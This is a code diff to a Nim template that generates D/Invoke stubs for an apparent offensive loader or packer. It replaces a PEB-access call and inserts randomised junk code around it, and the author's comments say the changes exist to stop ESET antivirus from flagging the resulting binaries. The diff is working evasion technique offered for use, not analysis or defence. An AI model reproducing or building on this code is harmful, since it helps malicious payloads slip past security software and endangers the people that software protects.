@@ -29,6 +29,7 @@ proc getRandStubInFunc(): string =
 """
   return randstub
 
+
 let DInvokeStubfirst * = """
 
 from winim/lean import ULONG, PVOID, SIZE_T, PSIZE_T, DWORD_PTR,LPDWORD,WINBOOL,TRUE,FALSE,HMODULE,LPOVERLAPPED, PIMAGE_SECTION_HEADER, LPCSTR, LPVOID, HANDLE, DWORD, GENERIC_READ, FILE_SHARE_READ, LPSECURITY_ATTRIBUTES, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, PIMAGE_DOS_HEADER, PIMAGE_NT_HEADERS, IMAGE_DIRECTORY_ENTRY_EXPORT, IMAGE_FIRST_SECTION, IMAGE_SIZEOF_SECTION_HEADER, PIMAGE_EXPORT_DIRECTORY, PDWORD, BOOL, PULONG, NTSTATUS, PROCESS_ALL_ACCESS, FALSE, MEM_COMMIT, PAGE_EXECUTE_READ_WRITE, PAGE_READWRITE, CLIENT_ID, OBJECT_ATTRIBUTES
@@ -68,6 +69,28 @@ type
 type
   LdrLoadDll_t* = proc (PathToFile: PWCHAR, Flags: ULONG, ModuleFileName: PUNICODE_STRING, ModuleHandle: PHANDLE): NTSTATUS {.stdcall.}
 
+# toDo: Syscall
+proc RtlGetCurrentPeb*(): pointer 
+  {.discardable, stdcall, dynlib: "ntdll", importc: "RtlGetCurrentPeb".}
+
+#[ This was the older alternative, which was the trigger for ESET to flag the resulting binaries, therefore I replaced that with RtlGetCurrentPeb.
+proc GetPPEB(p: culong): P_PEB {. 
+    header: 
+        '''#include <windows.h>
+           #include <winnt.h>''', 
+    importc: "__readgsqword"
+.}
+]#
+
+"""
+
+let DInvokeGetPEB * = fmt"""
+
+proc GetPPEB * (p: culong): P_PEB = 
+  # We need to put any stuff before and after this function, to avoid an ESET detection. It flags any Nim binary that uses this function alone.
+  {getRandStubInFunc()}
+  return cast[P_PEB](RtlGetCurrentPeb())
+  {getRandStubInFunc()}
 
 """
 
@@ -321,6 +344,7 @@ proc get_function_address*(hLibrary: HMODULE; fhash: cstring; ordinal: int, spec
 # Not verified working yet
 proc find_legacy_export*(hOriginalLibrary: HMODULE; fhash: cstring): PVOID =
   var functionAddress: PVOID
+  {getRandStubInFunc()}
   var Peb: PPEB = GetPPEB(PEB_OFFSET)
   #var Peb: PPEB = GetPEB()
   {getRandStubInFunc()}
